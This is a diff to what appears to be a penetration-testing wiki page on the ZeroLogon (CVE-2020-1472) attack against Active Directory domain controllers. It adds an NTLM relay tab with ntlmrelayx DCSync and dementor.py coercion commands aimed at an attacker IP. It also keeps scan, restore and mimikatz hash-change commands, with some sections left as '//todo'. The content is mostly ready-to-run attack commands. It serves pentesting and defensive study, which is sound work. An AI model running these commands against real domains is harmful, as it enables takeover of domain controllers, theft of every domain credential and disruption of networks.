@@ -12,6 +12,19 @@ This attack exploits an insecure customized cryptographic protocol used in the N
 
 This exploit changes the NT hash of the domain controller computer account in the Active Directory, but not in the local SAM database, hence creating some issues in Active Directory domains. In order to prevent denial of service, attackers can exploit the CVE, find the NT hash of the domain controller machine account before it was changed, and set it back in the AD.
 
+{% tabs %}
+{% tab title="NTLM relay" %}
+//todo
+
+```bash
+ntlmrelayx -t dcsync://$domain_controller_2 -smb2support
+dementor.py -d $domain -u $user -p $password $attacker_ip $domain_controller_1
+```
+{% endtab %}
+
+{% tab title="Password change \(disruptive\)" %}
+//todo
+
 ```bash
 # Scan for the vulnerability (https://github.com/SecuraBV/CVE-2020-1472)
 zerologon-scan 'DC_name' 'DC_IP_address'
@@ -32,6 +45,10 @@ zerologon-restore 'Domain'/'DC_account'@'Domain_controller' -target-ip 'DC_IP_ad
 # (alternate option mimikatz) Change the NT hash of the domain controller machine account in the AD back to its original value
 lsadump::changentlm /server:'DC.DOMAIN.LOCAL'  /user:'DC_name$' /oldntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /newntlm:'old_NThash'
 ```
+{% endtab %}
+{% endtabs %}
+
+
 
 
 
